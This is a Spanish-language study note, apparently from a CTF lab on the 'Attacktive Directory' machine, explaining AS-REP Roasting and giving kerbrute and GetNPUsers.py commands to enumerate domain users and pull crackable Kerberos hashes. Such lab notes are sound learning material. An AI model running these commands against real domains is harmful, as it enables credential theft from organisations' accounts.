Es una técnica que consiste en encontrar usuarios que no requieren pre-autenticación de Kerberos. Lo cual significa que cualquiera puede enviar una petición AS_REQ en nombre de uno de esos usuarios y recibir un mensaje AS_REP correcto. Esta respuesta contiene un pedazo del mensaje cifrado con la clave del usuario, que se obtiene de su contraseña. Para ello podemos usar una herramienta que se llama **GetNPUsers.py** usándola de la siguiente forma
# Herramientas
[[Kerbrute]]
[[GetNPUsers]]

# Ejemplom practico
Realizamos una enumeracion de usuarios con **kerbrute** y encontramos que hay un usuario que no necesita credenciales para validarse
```
kerbrute userenum --dc 10.10.143.170 -d THM-AD userlist.txt -o users.txt
```
![[Pasted image 20240717103359.png]]


----------------------------------------

**OPCIÓN 1 ->** Proporcionando un diccionario de usuarios, por ejemplo dentro del diccionario users
```
GetNPUsers.py spookysec.local/ -no-pass -usersfile userlist.txt -dc-ip 10.10.143.170
```
![[Pasted image 20240717120145.png]]

Podemos listar que unicamente muestre la salida correcta con el siguiente comando
```
GetNPUsers.py spookysec.local/ -no-pass -usersfile userlist.txt -dc-ip 10.10.143.170 2>&1 | grep -v "Kerberos SessionError" | grep -v "doesn't have UF_DONT_REQUIRE_PREAUTH set"
```
![[Pasted image 20240717120354.png]]

**OPCIÓN 2 ->** Proporcionando un único usuario que hayamos podido encontrar anteriormente
![[Pasted image 20240717120451.png]]

[[MAQUINA ATTACKTIVE DIRECTORY(enum4linux, kerbrute enumerar usuarios, ASREPRoasting obtener TGT, john the ripper, smbclient para listar recursos compartidos, secredump dumpear hashes y pass the hash)]]